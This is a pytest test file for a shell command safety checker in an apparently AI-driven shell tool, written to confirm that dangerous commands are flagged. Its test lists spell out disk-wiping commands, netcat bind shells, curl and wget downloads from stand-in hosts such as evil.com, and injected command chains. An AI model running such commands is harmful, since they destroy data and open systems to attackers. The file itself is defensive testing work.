"""Security validation tests for AI Shell."""

import pytest
from unittest.mock import patch

from ai_shell.executor import SecurityChecker


class TestSecurityValidation:
    """Comprehensive security validation tests."""

    def test_dangerous_filesystem_commands(self):
        """Test detection of dangerous filesystem commands."""
        checker = SecurityChecker()

        dangerous_commands = [
            "rm -rf /",
            "rm -rf /*", 
            "rm -rf ~",
            "format C:",
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda1",
        ]

        for cmd in dangerous_commands:
            assert (
                checker.is_dangerous_command(cmd)
            ), f"Command should be detected as dangerous: {cmd}"

    def test_dangerous_system_commands(self):
        """Test detection of dangerous system commands."""
        checker = SecurityChecker()

        dangerous_commands = [
            "shutdown -h now",
            "reboot",
            "halt",
            "poweroff",
            "killall -9",
            "pkill -9 -f .",
        ]

        for cmd in dangerous_commands:
            assert (
                checker.is_dangerous_command(cmd)
            ), f"Command should be detected as dangerous: {cmd}"

    def test_dangerous_network_commands(self):
        """Test detection of dangerous network commands."""
        checker = SecurityChecker()

        dangerous_commands = [
            "nc -l -p 4444 -e /bin/bash",
            "netcat -l -p 1234 -e /bin/sh",
            "curl http://malicious.com/script.sh",
            "wget http://evil.com/backdoor.sh",
        ]

        for cmd in dangerous_commands:
            assert (
                checker.is_dangerous_command(cmd)
            ), f"Command should be detected as dangerous: {cmd}"

    def test_safe_commands(self):
        """Test that safe commands are not flagged as dangerous."""
        checker = SecurityChecker()

        safe_commands = [
            "ls -la",
            "cat file.txt",
            "mkdir new_directory",
            "touch new_file.txt",
            "cp file1.txt file2.txt",
            "mv old_name.txt new_name.txt",
            "grep 'pattern' file.txt",
            "find . -name '*.py'",
            "chmod 755 script.sh",
            "ps aux",
            "top",
            "df -h",
            "du -sh *",
            "whoami",
            "pwd",
            "echo 'Hello World'",
            "date",
            "uname -a",
            "history",
            "which python",
            "python --version",
            "pip list",
            "git status",
            "vim file.txt",
            "nano file.txt",
        ]

        for cmd in safe_commands:
            assert not checker.is_dangerous_command(
                cmd
            ), f"Safe command incorrectly flagged as dangerous: {cmd}"

    def test_command_injection_patterns(self):
        """Test detection of basic command injection patterns."""
        checker = SecurityChecker()

        # Test some basic patterns that would be caught by dangerous commands
        injection_commands = [
            "ls; rm -rf /",
            "cat file.txt && shutdown -h now", 
        ]

        for cmd in injection_commands:
            assert (
                checker.is_dangerous_command(cmd)
            ), f"Command injection not detected: {cmd}"

    def test_case_insensitive_detection(self):
        """Test that dangerous command detection is case insensitive."""
        checker = SecurityChecker()

        variations = [
            "RM -RF /",
            "FORMAT C:",
            "SHUTDOWN -H NOW",
        ]

        for cmd in variations:
            assert (
                checker.is_dangerous_command(cmd)
            ), f"Case variation not detected as dangerous: {cmd}"

    def test_whitespace_and_special_characters(self):
        """Test detection with various whitespace and special characters."""
        checker = SecurityChecker()

        variations = [
            "  rm -rf /  ",
            "\trm -rf /\t",
            "rm  -rf  /",
        ]

        for cmd in variations:
            assert (
                checker.is_dangerous_command(cmd)
            ), f"Whitespace variation not detected: {cmd}"

    def test_custom_security_configuration(self):
        """Test custom security configuration."""
        custom_dangerous = ["custom_dangerous", "another_bad_command"]

        with patch("ai_shell.executor.get_config") as mock_config:
            mock_config.return_value.get.return_value = custom_dangerous
            checker = SecurityChecker()

            assert checker.is_dangerous_command("custom_dangerous")
            assert checker.is_dangerous_command("another_bad_command")
            assert not checker.is_dangerous_command("safe_command")

    def test_validation_with_dangerous_command(self):
        """Test command validation with dangerous commands."""
        checker = SecurityChecker()

        is_safe, message = checker.validate_command("rm -rf /")
        assert not is_safe
        assert message is not None
        assert "dangerous" in message.lower()

    def test_validation_with_safe_command(self):
        """Test command validation with safe commands."""
        checker = SecurityChecker()

        is_safe, message = checker.validate_command("ls -la")
        assert is_safe
        assert message is None

    def test_empty_and_invalid_commands(self):
        """Test handling of empty and invalid commands."""
        checker = SecurityChecker()

        # Empty command
        assert not checker.is_dangerous_command("")
        assert not checker.is_dangerous_command("   ")
        assert not checker.is_dangerous_command("\t\n")

        # None should not crash
        assert not checker.is_dangerous_command(None)

    def test_performance_with_long_commands(self):
        """Test performance with very long commands."""
        checker = SecurityChecker()

        # Very long safe command
        long_safe_command = "echo " + "a" * 10000
        assert not checker.is_dangerous_command(long_safe_command)

        # Very long dangerous command
        long_dangerous_command = "rm -rf / " + "a" * 10000
        assert checker.is_dangerous_command(long_dangerous_command)


class TestSecurityIntegration:
    """Integration tests for security features."""

    def test_security_checker_integration(self):
        """Test security checker integration with executor."""
        from ai_shell.executor import CommandExecutor

        executor = CommandExecutor()
        assert executor.security_checker is not None
        assert hasattr(executor.security_checker, "is_dangerous_command")
        assert hasattr(executor.security_checker, "validate_command")

    def test_default_dangerous_commands_list(self):
        """Test that default dangerous commands are properly loaded."""
        checker = SecurityChecker()
        dangerous_commands = checker.dangerous_commands

        # Should contain common dangerous patterns
        expected_patterns = ["rm -rf", "format", "shutdown"]
        for pattern in expected_patterns:
            assert any(
                pattern.lower() in cmd.lower() for cmd in dangerous_commands
            ), f"Expected dangerous pattern not found: {pattern}"